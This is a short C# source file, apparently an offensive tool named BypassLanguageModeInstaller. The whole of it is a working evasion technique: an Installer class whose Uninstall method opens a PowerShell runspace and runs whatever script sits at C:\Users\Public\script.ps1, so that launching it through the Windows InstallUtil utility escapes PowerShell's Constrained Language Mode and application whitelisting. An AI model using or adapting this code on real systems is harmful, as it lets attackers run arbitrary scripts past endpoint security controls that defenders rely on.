using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace BypassLanguageModeInstaller
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        string cmd = System.IO.File.ReadAllText(@"C:\Users\Public\script.ps1");
        ps.AddScript(cmd);
        ps.Invoke();
        rs.Close();
    }
}